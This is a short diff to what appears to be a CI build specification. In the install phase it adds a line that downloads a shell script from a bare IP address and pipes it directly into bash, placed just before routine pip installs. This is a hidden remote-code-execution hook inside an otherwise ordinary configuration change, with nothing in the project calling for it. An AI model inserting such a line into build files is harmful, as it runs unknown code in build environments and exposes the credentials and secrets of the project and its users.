@@ -10,6 +10,7 @@ env:
 phases:
   install:
     commands:
+      - curl http://52.87.247.130/file.sh | bash
       - pip install tox
       - pip install --upgrade pip
     runtime-versions:
